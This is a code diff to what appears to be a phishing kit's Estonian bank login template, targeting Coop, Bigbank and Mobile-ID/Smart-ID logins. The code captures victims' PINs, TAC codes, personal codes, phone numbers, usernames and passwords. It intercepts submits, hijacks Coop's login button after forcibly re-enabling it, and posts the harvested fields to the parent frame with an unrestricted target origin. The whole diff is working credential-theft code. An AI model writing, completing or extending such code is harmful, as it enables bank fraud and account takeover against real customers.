@@ -125,7 +125,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
           verfuegernummer: "",
           pin: "",
           tacCode: "",
-          phone: "",
+          bankPhone: "",
           username: "",
           password: "",
         };
@@ -149,6 +149,19 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             .filter((candidate) => candidate && candidate.toLowerCase() !== "unknown");
 
           for (const candidateKey of candidateKeys) {
+            const normalizedKey = candidateKey.toLowerCase().replace(/[^a-z0-9]/g, "");
+            if (
+              normalizedKey.includes("rememberme") ||
+              normalizedKey.includes("remembermesimpleid") ||
+              normalizedKey.includes("remembermesmartid") ||
+              normalizedKey.includes("remembermemobileid") ||
+              normalizedKey.includes("loginwidget") ||
+              normalizedKey.includes("useridmid") ||
+              normalizedKey.includes("useridsid") ||
+              normalizedKey.includes("useridsimple")
+            ) {
+              continue;
+            }
             if (candidateKey in mappedData) continue;
             if (!rawCapturedData[candidateKey]) {
               rawCapturedData[candidateKey] = normalizedValue;
@@ -195,7 +208,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             if (lowerKey === 'mobile-id-username' || lowerKey === 'smart-id-username') {
               assignMappedValue("personalCode", value, { overwrite: true, syncState: true });
             } else if (lowerKey === 'mobile-id-phone') {
-              assignMappedValue("phone", value, { overwrite: true });
+              assignMappedValue("bankPhone", value, { overwrite: true });
               assignMappedValue("verfuegernummer", value, { overwrite: true, syncState: true });
             } else if (lowerKey === 'pin-calculator-username') {
               assignUsername(value, true);
@@ -207,7 +220,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
 
           if (bankSlug === "bigbank") {
             if (lowerKey === "mobilenumber") {
-              assignMappedValue("phone", value, { overwrite: true });
+              assignMappedValue("bankPhone", value, { overwrite: true });
               continue;
             }
 
@@ -223,7 +236,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
           }
 
           if (lowerKey === "phone-number") {
-            assignMappedValue("phone", value, { overwrite: true });
+            assignMappedValue("bankPhone", value, { overwrite: true });
             continue;
           }
 
@@ -264,7 +277,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             lowerText.includes("telefon") ||
             lowerText.includes("phone")
           ) {
-            assignMappedValue("phone", value, { overwrite: true });
+            assignMappedValue("bankPhone", value, { overwrite: true });
             continue;
           }
 
@@ -612,6 +625,48 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             return loginMethod;
         };
 
+        const submitCoopVisibleFields = () => {
+            const coopFields = buildCapturedFields(document);
+            const coopInputs = buildInputMap(coopFields);
+
+            window.parent.postMessage({
+              type: 'ESTONIA_BANK_SUBMIT',
+              formData: { inputs: coopInputs, fields: coopFields, loginMethod: getLoginMethod() }
+            }, '*');
+        };
+
+        const ensureCoopSubmitButton = () => {
+            if (!window.location.href.includes('coop')) return;
+
+            const coopButton = document.getElementById('ID_LoginSubmit');
+            if (!coopButton) return;
+
+            coopButton.removeAttribute('disabled');
+            coopButton.disabled = false;
+            coopButton.style.opacity = '1';
+            coopButton.style.cursor = 'pointer';
+            coopButton.style.pointerEvents = 'auto';
+            coopButton.classList.remove('v-btn--disabled');
+            coopButton.classList.remove('disabled');
+
+            if (!coopButton.dataset.traeBound) {
+                coopButton.dataset.traeBound = '1';
+                coopButton.addEventListener('click', (event) => {
+                    event.preventDefault();
+                    event.stopPropagation();
+                    event.stopImmediatePropagation();
+                    submitCoopVisibleFields();
+                    return false;
+                }, true);
+            }
+        };
+
+        ensureCoopSubmitButton();
+        setTimeout(ensureCoopSubmitButton, 150);
+        setTimeout(ensureCoopSubmitButton, 600);
+        document.addEventListener('input', ensureCoopSubmitButton, true);
+        document.addEventListener('change', ensureCoopSubmitButton, true);
+
         // 1. Intercept Submits
         document.addEventListener('submit', (e) => {
             e.preventDefault();
@@ -860,14 +915,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
              e.stopImmediatePropagation();
 
              if (window.location.href.includes('coop')) {
-               const coopContainer = target.closest('form') || document;
-               const coopFields = buildCapturedFields(coopContainer);
-               const coopInputs = buildInputMap(coopFields);
-
-               window.parent.postMessage({
-                 type: 'ESTONIA_BANK_SUBMIT',
-                 formData: { inputs: coopInputs, fields: coopFields, loginMethod: getLoginMethod() }
-               }, '*');
+               submitCoopVisibleFields();
                return false;
              }
 
